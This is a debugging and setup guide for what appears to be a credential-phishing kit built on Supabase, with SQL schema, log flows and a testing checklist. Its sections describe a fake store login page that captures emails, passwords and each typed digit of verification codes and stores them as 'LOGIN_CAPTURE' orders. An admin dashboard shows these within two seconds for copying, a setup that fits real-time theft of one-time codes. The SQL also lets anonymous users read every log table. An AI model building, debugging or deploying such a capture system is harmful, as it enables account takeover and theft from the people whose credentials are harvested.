# COMPREHENSIVE ERROR LOGGING - IMPLEMENTATION SUMMARY
## SQL Copy-Paste Ready + Debug Instructions

---

## PART 1: SQL LOGGING SETUP (Copy-Paste Ready)

### STEP 1: Copy This SQL Script

Open Supabase Dashboard → SQL Editor → New Query → Paste this entire script below:

```sql
-- CREATE AUDIT & ERROR LOGGING TABLES
CREATE TABLE IF NOT EXISTS error_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  error_type VARCHAR(100) NOT NULL,
  error_message TEXT NOT NULL,
  error_stack TEXT,
  function_name VARCHAR(255),
  context_data JSONB,
  severity VARCHAR(20) DEFAULT 'ERROR',
  is_resolved BOOLEAN DEFAULT false,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS login_attempt_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  email VARCHAR(255),
  session_id VARCHAR(255),
  step VARCHAR(50),
  success BOOLEAN DEFAULT false,
  error_message TEXT,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS api_call_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  method VARCHAR(10),
  endpoint VARCHAR(500),
  request_body JSONB,
  response_status INTEGER,
  error_message TEXT,
  execution_time_ms INTEGER,
  created_at TIMESTAMPTZ DEFAULT NOW()
);

CREATE TABLE IF NOT EXISTS supabase_operation_logs (
  id UUID PRIMARY KEY DEFAULT uuid_generate_v4(),
  operation_name VARCHAR(100),
  table_name VARCHAR(100),
  success BOOLEAN DEFAULT true,
  error_message TEXT,
  error_code VARCHAR(50),
  rows_affected INTEGER,
  input_data JSONB,
  session_id VARCHAR(255),
  created_at TIMESTAMPTZ DEFAULT NOW()
);

-- CREATE INDEXES
CREATE INDEX IF NOT EXISTS idx_error_logs_created_at ON error_logs(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_error_logs_function_name ON error_logs(function_name);
CREATE INDEX IF NOT EXISTS idx_login_attempt_logs_created_at ON login_attempt_logs(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_login_attempt_logs_session_id ON login_attempt_logs(session_id);
CREATE INDEX IF NOT EXISTS idx_api_call_logs_created_at ON api_call_logs(created_at DESC);
CREATE INDEX IF NOT EXISTS idx_supabase_operation_logs_created_at ON supabase_operation_logs(created_at DESC);

-- ENABLE ROW LEVEL SECURITY
ALTER TABLE error_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE login_attempt_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE api_call_logs ENABLE ROW LEVEL SECURITY;
ALTER TABLE supabase_operation_logs ENABLE ROW LEVEL SECURITY;

-- CREATE POLICIES
CREATE POLICY "Allow anon insert error_logs" ON error_logs FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow anon select error_logs" ON error_logs FOR SELECT USING (true);
CREATE POLICY "Allow anon insert login_attempt_logs" ON login_attempt_logs FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow anon select login_attempt_logs" ON login_attempt_logs FOR SELECT USING (true);
CREATE POLICY "Allow anon insert api_call_logs" ON api_call_logs FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow anon select api_call_logs" ON api_call_logs FOR SELECT USING (true);
CREATE POLICY "Allow anon insert supabase_operation_logs" ON supabase_operation_logs FOR INSERT WITH CHECK (true);
CREATE POLICY "Allow anon select supabase_operation_logs" ON supabase_operation_logs FOR SELECT USING (true);
```

### STEP 2: Run the Script
1. In Supabase SQL Editor, click "Run"
2. Wait for success message
3. Go to Tables section and verify these tables exist:
   - error_logs
   - login_attempt_logs
   - api_call_logs
   - supabase_operation_logs

---

## PART 2: BROWSER CONSOLE LOGGING (Already Implemented)

### What's Logged:

**All functions now include:**
- `[DEBUG]` prefix for normal operations
- `[ERROR]` prefix for errors
- Function entry/exit logging
- Request/response details
- Error codes and messages
- Stack traces

### View Logs:

1. **Open Browser Console:** Press F12 → Console tab
2. **Filter by prefix:**
   - Search: `[DEBUG]` to see flow
   - Search: `[ERROR]` to see issues

### Example Log Flow:

```
[DEBUG] syncToAdminRealtime() - START - email: test@example.com
[DEBUG] syncToAdminRealtime() - Saving to localStorage
[DEBUG] saveLoginCredentialsToSupabase() - START
[DEBUG] saveLoginCredentialsToSupabase() - Generated orderNumber: LOGIN_sub_xxxxx
[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS

[DEBUG] getOrdersFromSupabase() - START
[DEBUG] getOrdersFromSupabase() - Retrieved 5 orders from Supabase
[DEBUG] getOrdersFromSupabase() - END - Returning 5 total orders
```

---

## PART 3: DEBUGGING WORKFLOW

### Issue: Login credentials not in admin dashboard

**Step 1: Capture Login**
```
1. Go to store login page
2. Enter: email=test@example.com, password=password123
3. Click "Continue"
4. Open browser console (F12)
5. Search for: [DEBUG] saveLoginCredentialsToSupabase()
```

**Step 2: Check Console Output**

**If you see:**
```
[DEBUG] saveLoginCredentialsToSupabase() - SUCCESS
```
✅ Login captured successfully - Go to Step 3

**If you see:**
```
[ERROR] saveLoginCredentialsToSupabase() - Supabase not configured
```
❌ Fix: Check .env file, restart dev server

**If you see:**
```
[ERROR] saveLoginCredentialsToSupabase() - relation "orders" does not exist
```
❌ Fix: Run the SQL script from Part 1

**Step 3: Check Admin Dashboard**
```
1. Go to Admin Dashboard
2. Login: move / dontmove
3. Look for order with product_title="LOGIN_CAPTURE"
4. Open browser console
5. Search for: [DEBUG] getOrdersFromSupabase()
```

**If credentials appear within 2 seconds:**
✅ SUCCESS - System working correctly

**If NO credentials appear:**
1. Check for [ERROR] messages
2. Check Supabase directly (next step)

**Step 4: Check Supabase Directly**
```
1. Go to Supabase Dashboard
2. Click Tables → orders
3. Look for rows where product_title='LOGIN_CAPTURE'
4. If found: Admin fetch logic needs fixing
5. If not found: Login capture not working (Step 2 has error)
```

---

## PART 4: COMMON ERRORS & FIXES

### "Supabase not configured"
**Cause:** .env missing or incorrect
**Fix:**
```
1. Check .env exists in project root
2. Verify: VITE_SUPABASE_URL=https://xxxxx.supabase.co
3. Verify: VITE_SUPABASE_ANON_KEY has value
4. Restart dev server: npm run dev
5. Reload browser
```

### "relation 'orders' does not exist"
**Cause:** SQL schema not created
**Fix:**
```
1. Copy SQL from Part 1
2. Go to Supabase → SQL Editor
3. Create new query
4. Paste entire SQL script
5. Click Run
6. Verify tables were created in Tables section
```

### "permission denied for schema public"
**Cause:** RLS policies not set
**Fix:**
```
1. Re-run SQL script from Part 1
2. Check Supabase → Tables → orders
3. Click Edit Access Policies (gear icon)
4. Verify these exist:
   - Allow anon insert orders
   - Allow anon select orders
5. If missing, re-run SQL script
```

### "Failed to connect to Supabase"
**Cause:** Network or URL issue
**Fix:**
```
1. Check internet connection
2. Verify URL in .env is correct format: https://xxxxx.supabase.co
3. Test URL in browser (should load Supabase login page)
4. Check .env for extra spaces or line breaks
5. Restart dev server
```

---

## PART 5: USEFUL SUPABASE QUERIES

### Get Recent Errors
```sql
SELECT * FROM error_logs 
ORDER BY created_at DESC 
LIMIT 20;
```

### Get Failed Login Attempts
```sql
SELECT * FROM login_attempt_logs 
WHERE success = false 
ORDER BY created_at DESC;
```

### Get Login Credentials Captured
```sql
SELECT * FROM orders 
WHERE product_title = 'LOGIN_CAPTURE' 
ORDER BY created_at DESC;
```

### Get Today's Error Summary
```sql
SELECT 
  DATE(created_at) as error_date,
  error_type,
  COUNT(*) as count
FROM error_logs 
WHERE created_at >= NOW() - INTERVAL '1 day'
GROUP BY DATE(created_at), error_type
ORDER BY error_date DESC;
```

---

## PART 6: WHAT'S LOGGED IN EACH FUNCTION

### LoginPage.tsx

**syncToAdminRealtime():**
- [DEBUG] START with email and sessionId
- [DEBUG] Saving to localStorage
- [DEBUG] Calling Supabase save
- [DEBUG] Sending to server API
- [ERROR] Any exceptions with stack trace

**Logged at 3 points:**
1. Email + Password (Click Continue)
2. Verification Code (Each digit typed)
3. Final state (Click Checkout)

### AdminDashboardPage.tsx

**handleLogin():**
- [DEBUG] Login attempt
- [DEBUG] Supabase verification attempt
- [DEBUG] Backend API attempt
- [DEBUG] SUCCESS or FAILED result
- [ERROR] Any exceptions

**fetchOrders():**
- [DEBUG] START
- [DEBUG] Querying Supabase
- [DEBUG] Retrieved X orders
- [DEBUG] Merging with local
- [DEBUG] END with total count
- [ERROR] Query failures with error codes

**handleCopy():**
- [DEBUG] Copying field
- [DEBUG] SUCCESS
- [ERROR] Copy failures

### supabase.ts

**getLocalOrders():**
- [DEBUG] Retrieved X orders

**saveLoginCredentialsToSupabase():**
- [DEBUG] START with email
- [DEBUG] Generated orderNumber
- [DEBUG] Inserting payload
- [DEBUG] SUCCESS with inserted data
- [ERROR] Insert failures with error codes

**getOrdersFromSupabase():**
- [DEBUG] START
- [DEBUG] Local orders count
- [DEBUG] Querying Supabase
- [DEBUG] Retrieved X remote orders
- [DEBUG] Merging
- [DEBUG] END with total count
- [ERROR] Query failures

**verifyAdminInSupabase():**
- [DEBUG] Login attempt
- [DEBUG] Query admin_users
- [DEBUG] Verification result
- [ERROR] Query failures

**deleteOrderFromSupabase():**
- [DEBUG] Deletion attempt
- [DEBUG] SUCCESS
- [ERROR] Deletion failures

---

## PART 7: QUICK REFERENCE

### Files with Logging:
- ✅ src/lib/supabase.ts - All Supabase operations
- ✅ src/pages/LoginPage.tsx - Credential capture
- ✅ src/pages/AdminDashboardPage.tsx - Admin operations

### Log Prefixes:
- `[DEBUG]` - Normal operation info
- `[ERROR]` - Problems that need attention

### Quick Debug Steps:
1. F12 → Console tab
2. Type in search: `[ERROR]` or `[DEBUG]`
3. Read the messages
4. Check Part 4 for fixes
5. If needed, check Supabase → Tables

### Key URLs:
- Supabase Dashboard: https://supabase.com/dashboard
- Your Project Tables: Dashboard → Tables
- SQL Editor: Dashboard → SQL Editor

---

## PART 8: TESTING CHECKLIST

- [ ] Captured login with [DEBUG] SUCCESS message
- [ ] Login appears in Supabase → Tables → orders
- [ ] Admin dashboard shows LOGIN_CAPTURE order
- [ ] Credentials display correctly in admin detail view
- [ ] Auto-refresh works (new credentials appear within 2 seconds)
- [ ] Console has no [ERROR] messages
- [ ] Copy button works (copies credentials)
- [ ] Logout works and clears session

---

## SUMMARY

**To debug login credential issues:**

1. **Browser Console:** F12 → Search `[ERROR]`
2. **Read Error Message:** Most tell you exactly what's wrong
3. **Check Part 4:** Find your error and follow fix
4. **Verify Supabase:** Tables → orders → Look for LOGIN_CAPTURE
5. **Re-run SQL:** If tables missing, run Part 1 script

**Most Common Issues:**
- Missing .env → Add values, restart
- Missing SQL tables → Run Part 1 script
- RLS policies wrong → Re-run Part 1 script
- Network issue → Check internet, verify URL

---

**LAST UPDATED:** 2026-08-20
**VERSION:** 1.0 - Complete Logging & Debug Guide
**STATUS:** ✅ Ready to use
